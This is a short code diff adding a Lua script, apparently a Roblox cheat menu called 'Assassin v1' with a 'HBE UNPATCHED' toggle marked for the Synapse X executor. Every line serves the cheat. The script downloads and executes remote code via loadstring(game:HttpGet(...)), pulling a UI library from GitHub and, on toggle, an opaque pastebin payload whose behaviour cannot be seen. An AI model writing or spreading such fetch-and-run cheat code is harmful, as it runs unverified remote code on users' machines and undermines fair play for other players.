@@ -1,0 +1,12 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Assassin v1", "Sentinel")
+local Tab = Window:NewTab("HBE")
+local Section = Tab:NewSection("HBE UNPATCHED")
+Section:NewToggle("HBE UNPATCHED!", "Synapse x only", function(state)
+    loadstring(game:HttpGet("https://pastebin.com/raw/vZvDU5yC"))()
+    if state then
+        print("Toggle On")
+    else
+        print("Toggle Off")
+    end
+end)
